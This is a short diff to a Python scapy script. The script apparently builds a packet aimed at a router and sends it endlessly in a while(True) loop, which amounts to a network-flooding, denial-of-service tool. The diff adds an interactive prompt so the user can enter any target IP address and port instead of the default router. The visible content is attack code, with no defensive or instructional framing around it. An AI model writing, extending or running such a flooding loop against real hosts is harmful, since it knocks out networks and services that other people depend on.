@@ -9,9 +9,18 @@ def build_packet(ip, port):
 
 
 def main():
+    #my_router:
     router_ip = "192.168.1.1"
     port = 80
+
+    answer = input("wanna enter manully the data? [Y/N]")
+    answer = answer.lower()
+    if(answer == "y"):
+        router_ip = input("enter ip")
+        port = input("enter port")
+
     packet = build_packet(router_ip, port)
+
     while(True):
         scapy.send(packet)
 
